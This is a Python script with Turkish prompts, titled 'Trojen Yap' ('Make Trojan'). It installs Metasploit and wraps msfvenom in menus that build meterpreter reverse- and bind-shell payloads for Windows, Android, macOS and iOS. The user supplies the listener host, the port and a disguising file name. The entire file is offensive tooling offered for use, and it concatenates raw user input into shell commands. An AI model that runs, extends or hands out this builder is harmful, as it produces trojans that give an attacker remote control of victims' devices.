import os
import colorama
from  colorama import  Fore

os.system("apt-get install figlet")
os.system("pip install colorama")
os.system("apt-get install update")
os.system("apt-get update")
os.system("apt-get install metasploit")
os.system("clear")

hata = "figlet Hata!"
while True:
    os.system("clear")
    amblem = os.system("figlet Trojen Yap.")
    ana_menü = str("""
        
    1) Windows sistemler için.
    2) Android sistemler için.
    3) Mac sistemler için.
    4) os sistemler için.
    """)
    print(ana_menü)
    işlem_no = input("İşlem no:")
    if işlem_no == "1":
        os.system("clear")
        menü = """
        1) windows/meterpreter_reverse_tcp

        2) windows/meterpreter_reverse_ipv6_tcp

        3) windows/meterpreter_reverse_https

        4) windows/meterpreter_reverse_http

        5) windows/meterpreter_bind_tcp

        6) windows/metsvc_bind_tcp

        7) windows/metsvc_reverse_tcp
        """
        amblem = os.system("figlet payloadlar.")
        print(amblem)
        print(menü)
        p_ad_no = input("Payload no: ")
#1.bölüm başlangıcı
        if p_ad_no == "1":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p windows/meterpreter_reverse_tcp " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "2":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p windows/meterpreter_reverse_ipv6_tcp " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "3":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p windows/meterpreter_reverse_https " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "4":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p windows/meterpreter_reverse_http " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "5":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p windows/meterpreter_bind_tcp " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "6":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p windows/metsvc_bind_tcp " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "7":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p windows/metsvc_reverse_tcp " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
#2. bölüm başlangıcı
    if işlem_no == "2":
        os.system("clear")
        menü2 = """
        1) android/meterpreter/reverse_http
        2) android/meterpreter/reverse_https
        3) android/meterpreter/reverse_tcp
        """
        amblem2 = os.system("figlet ayload")
        print(amblem2)
        print(menü2)
        p_ad_no = input("Payload no: ")
        if p_ad_no == "1":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p android/meterpreter/reverse_http " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "2":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p android/meterpreter/reverse_https " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "3":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p android/meterpreter/reverse_tcp " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
# 3. bölüm başlangıcı 
    if işlem_no == "3":
        os.system("clear")
        menü3 = """
        1) osx/x64/meterpreter_reverse_http
        2) osx/x64/meterpreter_reverse_https
        3) osx/x64/meterpreter_reverse_tcp
        """
        amblem3 = os.system("figlet ayload")
        print(amblem3)
        print(menü3)
        p_ad_no = input("Payload no: ")
        if p_ad_no == "1":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p osx/x64/meterpreter_reverse_http " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "2":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p osx/x64/meterpreter_reverse_https " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "3":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p osx/x64/meterpreter_reverse_tcp " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
#4.Bölüm başlangıcı
    if işlem_no == "4":
        os.system("clear")
        menü3 = """
        1) apple_ios/aarch64/meterpreter_reverse_http
        2) apple_ios/aarch64/meterpreter_reverse_https
        3) apple_ios/aarch64/meterpreter_reverse_tcp
        """
        amblem3 = os.system("figlet ayload")
        print(amblem3)
        print(menü3)
        p_ad_no = input("Payload no: ")
        if p_ad_no == "1":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p apple_ios/aarch64/meterpreter_reverse_http " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "2":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p apple_ios/aarch64/meterpreter_reverse_https " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
        elif p_ad_no == "3":
            os.system("clear")
            kayıt_dizini = input("Bir dizin belirle:  ")
            lhost = input("LHOST ip: ")
            lport = input("LPORT ip: ")
            dosya_adı = input("Trojenine bir isim + uzantı ver: ")
            başlat = input("Oluşturulsunmu (e/h) : ")
            if başlat == "e":
                os.system("cd " + kayıt_dizini)
                os.system("clear")
                os.system("msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp " + "LHOST=" + lhost + " LPORT=" + lport + " > " + dosya_adı)
                print("Trojeniniz başarılyla oluştruludu,belirlediğiniz konumda.")
                break
    else:
        os.system(hata)
else:
    os.system(hata)